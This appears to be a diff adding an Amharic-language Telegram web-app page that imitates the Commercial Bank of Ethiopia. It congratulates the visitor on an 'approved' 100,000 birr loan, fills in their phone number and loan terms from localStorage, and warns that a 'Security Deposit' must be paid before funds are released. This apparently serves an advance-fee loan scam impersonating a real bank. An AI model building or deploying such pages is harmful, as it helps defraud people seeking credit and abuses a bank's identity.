@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>እንኳን ደስ አለዎት - የኢትዮጵያ ንግድ ባንክ</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --cbe-purple: #51255e;
+            --bg-purple: #51255e;
+            --card-bg: #ffffff;
+            --text-dark: #111;
+            --text-gray: #666;
+            --warning-bg: #fcf9fc;
+            --warning-border: #ebd9ed;
+            --warning-title: #51255e;
+        }
+
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-purple); margin: 0; padding: 20px 15px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+
+        .screen-container {
+            width: 100%; max-width: 400px; background-color: var(--card-bg);
+            border-radius: 24px; padding: 30px 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            display: flex; flex-direction: column; align-items: center;
+        }
+
+        .check-circle {
+            width: 75px; height: 75px; background: var(--cbe-purple); color: white;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 34px; font-weight: 900; margin-bottom: 18px;
+        }
+
+        .congrats-title { font-size: 22px; font-weight: 800; color: #000; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
+        .sub-text { color: var(--text-gray); font-size: 14px; text-align: center; line-height: 1.4; margin-bottom: 20px; }
+
+        .amount-box {
+            width: 100%; background: var(--cbe-purple); border-radius: 14px;
+            padding: 20px 15px; text-align: center; color: white; margin-bottom: 20px;
+        }
+        .amount-label { font-size: 12px; font-weight: 800; text-transform: uppercase; opacity: 0.9; margin-bottom: 6px; }
+        .amount-value { font-size: 28px; font-weight: 900; }
+
+        .info-card {
+            width: 100%; background-color: var(--warning-bg); border: 1.5px solid var(--warning-border);
+            border-radius: 12px; padding: 16px; margin-bottom: 20px;
+        }
+        .info-header { display: flex; align-items: center; gap: 6px; margin-bottom: 8px; color: var(--warning-title); font-weight: 800; font-size: 13.5px; }
+        .info-body { font-size: 13px; line-height: 1.5; color: #444; }
+
+        .details-list { width: 100%; margin-bottom: 15px; }
+        .details-heading { display: flex; align-items: center; gap: 8px; margin-bottom: 14px; font-size: 15px; font-weight: 800; color: var(--text-dark); }
+
+        .detail-item { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
+        .icon-bg { width: 40px; height: 40px; background-color: #f4eef5; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 18px; }
+        .detail-label { font-size: 11px; color: var(--text-gray); text-transform: uppercase; font-weight: 700; }
+        .detail-val { font-size: 14px; font-weight: 800; color: var(--text-dark); }
+
+        .home-btn {
+            background-color: var(--cbe-purple); color: white; border: none; width: 100%;
+            padding: 15px; border-radius: 12px; font-size: 15px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="screen-container">
+        <div class="check-circle">✓</div>
+        
+        <div class="congrats-title">🎉 እንኳን ደስ አለዎት!</div>
+        <div class="sub-text">የብድር ጥያቄዎ <b>ጸድቋል!</b> ገንዘቡ ወደሒሳብዎ ይለቀቃል።</div>
+
+        <div class="amount-box">
+            <div class="amount-label">የጸደቀው የብድር መጠን</div>
+            <div class="amount-value" id="display-amount">100 000 ብር</div>
+        </div>
+
+        <div class="info-card">
+            <div class="info-header">⚠️ ማስታወሻ</div>
+            <div class="info-body">
+                ብድሩ ሙሉ በሙሉ ወደ የባንክ አካውንትዎ እንዲገባ የሂሳብ ማረጋገጫ (Security Deposit) ማሟላት ይጠበቅብዎታል።
+            </div>
+        </div>
+
+        <div class="details-list">
+            <div class="details-heading"><span>💳</span> የብድር ዝርዝር</div>
+
+            <div class="detail-item">
+                <div class="icon-bg">🇪🇹</div>
+                <div>
+                    <div class="detail-label">ስልክ ቁጥር</div>
+                    <div class="detail-val" id="display-phone">+251 ...</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">💵</div>
+                <div>
+                    <div class="detail-label">ወርሃዊ ክፍያ</div>
+                    <div class="detail-val" id="display-monthly">9 166 ብር</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📅</div>
+                <div>
+                    <div class="detail-label">የቆይታ ጊዜ</div>
+                    <div class="detail-val" id="display-term">12 ወራት</div>
+                </div>
+            </div>
+        </div>
+
+        <button class="home-btn" onclick="window.location.href='/'">🏠 ወደ መነሻ ገጽ ተመለስ</button>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            if (window.Telegram?.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
+
+            const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
+            const loanAmount = localStorage.getItem('loan_amount') || "100000";
+            const loanTerm = localStorage.getItem('loan_term') || "12";
+            const monthlyPay = localStorage.getItem('monthly_repayment') || "9166";
+
+            document.getElementById('display-amount').innerText = Number(loanAmount).toLocaleString('en-US') + " ብር";
+            document.getElementById('display-phone').innerText = savedPhone ? `+251 ${savedPhone.replace(/^\+?251/, '')}` : "+251 ...";
+            document.getElementById('display-term').innerText = loanTerm + " ወራት";
+            document.getElementById('display-monthly').innerText = Number(monthlyPay).toLocaleString('en-US') + " ብር";
+        });
+    </script>
+</body>
+</html>
